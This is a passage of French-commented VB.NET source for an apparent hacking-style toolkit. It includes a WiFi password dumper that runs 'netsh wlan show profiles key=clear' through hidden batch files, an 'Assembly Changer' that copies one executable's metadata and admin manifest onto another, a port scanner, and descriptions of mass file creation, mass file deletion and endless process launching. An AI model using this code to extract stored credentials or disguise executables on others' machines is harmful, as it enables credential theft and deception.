    Private Sub LogInButtonWithProgress20_Click(sender As Object, e As EventArgs) Handles LogInButtonWithProgress20.Click
        Info(LogInCheckBox2.Text, "Permet de créer une multitude de fichiers, vous choisissez leur répertoire ainsi que combien en créer.")
    End Sub

    Private Sub LogInButtonWithProgress18_Click(sender As Object, e As EventArgs) Handles LogInButtonWithProgress18.Click
        Info(LogInCheckBox2.Text, "Permet de supprimer tous les fichiers dont vous aurez choisi l'extension, dans le même répertoire.")
    End Sub

    Private Sub LogInButtonWithProgress30_Click(sender As Object, e As EventArgs) Handles LogInButtonWithProgress30.Click
        Info(LogInCheckBox2.Text, "Permet de laner un procéssus choisi à l'infini.")
    End Sub

    Private Sub LogInButtonWithProgress28_Click(sender As Object, e As EventArgs) Handles LogInButtonWithProgress28.Click

    End Sub

    Private Sub LogInButtonWithProgress26_Click(sender As Object, e As EventArgs) Handles LogInButtonWithProgress26.Click

    End Sub

    Private Sub LogInButtonWithProgress24_Click(sender As Object, e As EventArgs) Handles LogInButtonWithProgress24.Click

    End Sub



    'ASSEMBLY CHANGER
#Region "Assembly Changer"

    Dim chemin1$ = "" 'Le $ signifie "As String"
    Dim chemin2$ = ""
    Dim path() As String = {""}

    Private Sub Form1_DragEnter(sender As System.Object, e As System.Windows.Forms.DragEventArgs) Handles DropArea1.DragEnter
        If e.Data.GetDataPresent(DataFormats.FileDrop) Then 'On vérifie si l'élément glissé est un fichier...
            e.Effect = DragDropEffects.All 'On accepte les donnés
            path = e.Data.GetData(DataFormats.FileDrop, False) 'On assigne le chemin d'accès du fichier à la variable path
        Else
            e.Effect = DragDropEffects.None 'On n'accepte pas les données
        End If
    End Sub
    Private Sub Form1_DragDrop(sender As System.Object, e As System.Windows.Forms.DragEventArgs) Handles DropArea1.DragDrop
        chemin1 = ""
        For i = 0 To path.Length - 1
            chemin1 += path(i)
        Next
        LogInLabel3.Text = "Source > " & chemin1
    End Sub

    Private Sub Form1_DragEnter2(sender As System.Object, e As System.Windows.Forms.DragEventArgs) Handles DropArea2.DragEnter
        If e.Data.GetDataPresent(DataFormats.FileDrop) Then 'On vérifie si l'élément glissé est un fichier...
            e.Effect = DragDropEffects.All 'On accepte les donnés
            path = e.Data.GetData(DataFormats.FileDrop, False) 'On assigne le chemin d'accès du fichier à la variable path
        Else
            e.Effect = DragDropEffects.None 'On n'accepte pas les données
        End If
    End Sub
    Private Sub Form1_DragDrop2(sender As System.Object, e As System.Windows.Forms.DragEventArgs) Handles DropArea2.DragDrop
        chemin2 = ""
        For i = 0 To path.Length - 1
            chemin2 += path(i)
        Next
        LogInLabel4.Text = "Destination > " & chemin2
    End Sub

    Private Sub Form1_DragEnter3(sender As System.Object, e As System.Windows.Forms.DragEventArgs) Handles DropArea3.DragEnter
        If e.Data.GetDataPresent(DataFormats.FileDrop) Then 'On vérifie si l'élément glissé est un fichier...
            e.Effect = DragDropEffects.All 'On accepte les donnés
            path = e.Data.GetData(DataFormats.FileDrop, False) 'On assigne le chemin d'accès du fichier à la variable path
        Else
            e.Effect = DragDropEffects.None 'On n'accepte pas les données
        End If
    End Sub
    Private Sub Form1_DragDrop3(sender As System.Object, e As System.Windows.Forms.DragEventArgs) Handles DropArea3.DragDrop
        chemin1 = ""
        For i = 0 To path.Length - 1
            chemin1 += path(i)
        Next
        txticone.Text = chemin1
        setPicIcon()
    End Sub

    Dim ofd1, ofd2 As New OpenFileDialog
    Private Sub LogInButtonWithProgress36_Click_1(sender As Object, e As EventArgs) Handles LogInButtonWithProgress36.Click
        With ofd1
            .Title = "Fichier source :"
            .Filter = "Fichier executable (*.exe)|*.exe"
            .Multiselect = False
            .FileName = ""
            If .ShowDialog = Windows.Forms.DialogResult.OK Then
                LogInNormalTextBox1.Text = .FileName
                LogInLabel3.Text = "Source > " & chemin1
            Else : Exit Sub
            End If
        End With
    End Sub
    Private Sub LogInButtonWithProgress37_Click(sender As Object, e As EventArgs) Handles LogInButtonWithProgress37.Click
        With ofd2
            .Title = "Fichier de destination :"
            .Filter = "Fichier executable (*.exe)|*.exe"
            .Multiselect = False
            .FileName = ""
            If .ShowDialog = Windows.Forms.DialogResult.OK Then
                LogInNormalTextBox2.Text = .FileName
                LogInLabel4.Text = "Destination > " & chemin2
            Else : Exit Sub
            End If
        End With
    End Sub

    Private Sub LogInButtonWithProgress38_Click(sender As Object, e As EventArgs) Handles LogInButtonWithProgress38.Click
        Try

            ofd1.FileName = chemin1
            ofd2.FileName = chemin2

            Ressource.NullFileInfo(ofd2.FileName)
            Ressource.WriteAdminManifest(ofd2.FileName, My.Resources.Necessaire)

            CloneIt(ofd1.FileName, ofd2.FileName)

            MsgBox("Tâche accomplie ! ", MsgBoxStyle.Information, "VBVEC - AssemblyChanger")
        Catch ex As Exception
            MsgBox("Erreur critique ! Vérifiez les fichiers !", MsgBoxStyle.Critical, "VBVEC - AssemblyChanger")
        End Try
    End Sub

    Private Sub TabPage4_Click(sender As Object, e As EventArgs) Handles LogInTabControl1.Selected
        If LogInTabControl1.SelectedTab Is TabPage4 Then
            LogInTabControl1.SelectedTab = TabPage1
            About.ShowDialog()
        End If

        If My.Settings.CheckPremium = True Then

        Else
            If LogInTabControl1.SelectedTab Is TabPage5 Or LogInTabControl1.SelectedTab Is TabPage3 Then
                LogInTabControl1.SelectedTab = TabPage1
                MsgBox("Vous devez être premium pour utiliser ceci.", vbExclamation)
            End If
        End If


    End Sub



    Private Sub Form1_Closing(sender As Object, e As EventArgs) Handles MyBase.FormClosing
        If File.Exists(dossierdebase() & "\\res.exe") Then
            File.Delete(dossierdebase() & "\\res.exe")
        End If
        If File.Exists(dossierdebase() & "\\res.ini") Then
            File.Delete(dossierdebase() & "\\res.ini")
        End If
        If File.Exists(dossierdebase() & "\\res.log") Then
            File.Delete(dossierdebase() & "\\res.log")
        End If
        If File.Exists(dossierdebase() & "\\info.res") Then
            File.Delete(dossierdebase() & "\\info.res")
        End If
    End Sub
#End Region
    '======================
    '=== MOT DE PASSE WIFI
#Region "MOT DE PASSE WIFI"
    Dim g_ssid, h_ssid As String
    Dim g_pwd, h_pwd As String

    Dim o_id As Integer = 0
    Private Sub LogInButtonWithProgress39_Click_1(sender As Object, e As EventArgs) Handles LogInButtonWithProgress39.Click
        'ListView2.Clear()


        startprgrmwifi("cmd /c netsh wlan show profiles")

        Dim pattern As String = "(: )(.*)"
        Dim options As RegexOptions = RegexOptions.Multiline

        Dim input_s As String = g_ssid
        Dim o_id As Integer = 0
        For Each m As Match In Regex.Matches(input_s, pattern, options)
            m = m.NextMatch()
            h_ssid = m.Groups(2).Value
            rgx_wifi(m.Groups(2).Value)

            list_add()
        Next


    End Sub

    Private Sub LogInButtonWithProgress40_Click(sender As Object, e As EventArgs) Handles LogInButtonWithProgress40.Click
        Dim SFD1 As New SaveFileDialog
        SFD1.Filter = "Fichier Texte (*.txt)|*.txt|Fichier HTML (*.html)|*.html|Fichier HTM (*.htm)|*.htm"

        If SFD1.ShowDialog = 1 Then
            File.WriteAllText(SFD1.FileName, ListView2.Items(ListView2.FocusedItem.Index).SubItems(1).Text & " | " & ListView2.Items(ListView2.FocusedItem.Index).SubItems(2).Text)
        Else
            Me.Show()
        End If
    End Sub


    Private Sub rgx_wifi(g_input)
        startprgrmwifi("cmd /c netsh wlan show profiles " & Chr(34) & g_input & Chr(34) & " key=clear |find /I " & Chr(34) & "Conte" & Chr(34))

        Dim pattern As String = "(: )(.*)"
        Dim options As RegexOptions = RegexOptions.Multiline

        Dim input_p As String = g_pwd
        For Each m As Match In Regex.Matches(input_p, pattern, options)
            h_pwd = m.Groups(2).Value
        Next

    End Sub

    Private Sub list_add()
        o_id += 1
        Dim itema As New ListViewItem

        itema.UseItemStyleForSubItems = False
        itema.Text = o_id
        itema.SubItems.Add(h_ssid)
        itema.SubItems.Add(h_pwd)
        ListView2.Items.Add(itema)
    End Sub

    Private Sub startprgrmwifi(ByVal bat_command As String)

        Dim file_path As String = IO.Path.GetTempPath

        Dim FILE_NAME As String = file_path & "\000-wifi.bat"

        Dim fs As FileStream = File.Create(FILE_NAME)
        Dim info As Byte() = New UTF8Encoding(True).GetBytes(bat_command)
        fs.Write(info, 0, info.Length)
        fs.Close()
        Dim start_info As New ProcessStartInfo(FILE_NAME)
        start_info.UseShellExecute = False
        start_info.CreateNoWindow = True
        start_info.RedirectStandardOutput = True
        start_info.RedirectStandardError = True

        Dim proc As New Process()
        proc.StartInfo = start_info
        proc.Start()

        Dim std_out As StreamReader = proc.StandardOutput()
        Dim std_err As StreamReader = proc.StandardError()

        g_ssid = std_out.ReadToEnd()
        g_pwd = g_ssid

        std_out.Close()
        std_err.Close()
        proc.Close()
        My.Computer.FileSystem.DeleteFile(FILE_NAME)
    End Sub
#End Region
    '======================

    '======================
    '=== SCANNEUR DE PORTS
#Region "SCANNEUR DE PORTS"
    Private dtResults As DataTable
    Private WithEvents myScanner As clsScanner
    Dim CallIncrementProgressBar As New MethodInvoker(AddressOf Me.IncrementProgressBar)
    Private Sub LogInButtonWithProgress42_Click(sender As Object, e As EventArgs) Handles LogInButtonWithProgress42.Click
        'dtResults.Clear()
        'dgResults.DataSource = Nothing
        'ListView3.Clear

        If (ListView3.Items.Count > 0) Then
            ListView3.Items.Clear()
        End If

        checkOpen.Enabled = False
        LogInButtonWithProgress42.Enabled = False
        'mnuScan.Enabled = False
        'mnuSaveResults.Enabled = False
        'mnuSRSaveResultXML.Enabled = False
        myScanner = New clsScanner(txtHost.Text, Int(txt_portfrom.Text), Int(txt_portto.Text))
        ProgressBar1.Minimum = Int(txt_portfrom.Text)
        ProgressBar1.Maximum = Int(txt_portto.Text)
        ProgressBar1.Value = Int(txt_portfrom.Text)
        myScanner.Start()
    End Sub

    Private Sub PortOpen_myScanner(ByVal Host As String, ByVal Port As Integer) Handles myScanner.PortOpen
        WritePort(Host, Port, clsScanner.portState.Open)
        Me.BeginInvoke(CallIncrementProgressBar) ''Invoke the IncrementProgressBar sub in the same thread as the Form
    End Sub

    Private Sub PortClosed_myScanner(ByVal Host As String, ByVal Port As Integer) Handles myScanner.PortClosed
        WritePort(Host, Port, clsScanner.portState.Closed)
        Me.BeginInvoke(CallIncrementProgressBar) ''Invoke the IncrementProgressBar sub in the same thread as the Form
    End Sub
    Private Sub IncrementProgressBar()
        If ProgressBar1.Value < ProgressBar1.Maximum Then
            ProgressBar1.Value += 1
            If LogInGroupBox8.Text <> "Scan en cours...   " & "[" & Int((ProgressBar1.Value - ProgressBar1.Minimum) / (ProgressBar1.Maximum - ProgressBar1.Minimum) * 100) & "%]" Then LogInGroupBox8.Text = "Scan en cours...   " & "[" & Int((ProgressBar1.Value - ProgressBar1.Minimum) / (ProgressBar1.Maximum - ProgressBar1.Minimum) * 100) & "%]"
            ListView3.Enabled = False
        Else
            'dgResults.DataSource = dtResults
            LogInGroupBox8.Text = "Résultats de scans"
            ListView3.Enabled = True
            txtHost.Enabled = True
            txt_portfrom.Enabled = True
            txt_portto.Enabled = True
            checkOpen.Enabled = True
            LogInButtonWithProgress42.Enabled = True
            'mnuScan.Enabled = True
            'mnuSaveResults.Enabled = True
            'mnuSRSaveResultXML.Enabled = True
        End If
    End Sub


    ' Value to track which column was previously sorted
    Dim sortColumn As Integer = -1

    Private Sub ListView3_ColumnClick(sender As Object, e As ColumnClickEventArgs) Handles ListView3.ColumnClick

        ' If current column is not the previously clicked column
        ' Add
        If Not e.Column = sortColumn Then

            ' Set the sort column to the new column
            sortColumn = e.Column
            'Default to ascending sort order
            ListView3.Sorting = SortOrder.Ascending

        Else

            'Flip the sort order
            If ListView3.Sorting = SortOrder.Ascending Then
                ListView3.Sorting = SortOrder.Descending
            Else
                ListView3.Sorting = SortOrder.Ascending
            End If
        End If

        'Set the ListviewItemSorter property to a new ListviewItemComparer object
        ListView3.ListViewItemSorter = New ListView_Sorter(e.Column, ListView3.Sorting)

        ' Call the sort method to manually sort
        ListView1.Sort()


    End Sub



    Private Function WritePort(ByVal Host As String, ByVal Port As Integer, ByVal State As clsScanner.portState)

        If (checkOpen.Checked And State = clsScanner.portState.Open) Or (Not (checkOpen.Checked)) Then


            Dim item As New ListViewItem
            item.UseItemStyleForSubItems = False
            item.Text = Host
            item.SubItems.Add(Port)
            item.SubItems.Add(State.ToString)
            If State = clsScanner.portState.Open Then item.SubItems.Add(GetServiceName(Port))

            Invoke(New MethodInvoker(Sub() ListView3.Items.Add(item)))

        End If
    End Function

    Private Sub PictureBox3_Click(sender As Object, e As EventArgs) Handles PictureBox3.Click
        MsgBox("Ceci nécessite des droits administrateur.")
    End Sub

    Public Function GetServiceName(ByVal Port As Integer) As String
        Dim strName As String = ConfigurationManager.AppSettings("Port" & Port)
        If Len(strName) = 0 Then
            strName = ""
        End If

        Return strName
    End Function


    Private Sub txtFrom_KeyPress(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyPressEventArgs) Handles txt_portto.KeyPress, txt_portfrom.KeyPress
        If e.KeyChar.IsLetter(e.KeyChar) Or e.KeyChar.IsSymbol(e.KeyChar) Or e.KeyChar.IsPunctuation(e.KeyChar) Then
            e.Handled = True
        End If
    End Sub
#End Region
    '======================




End Class
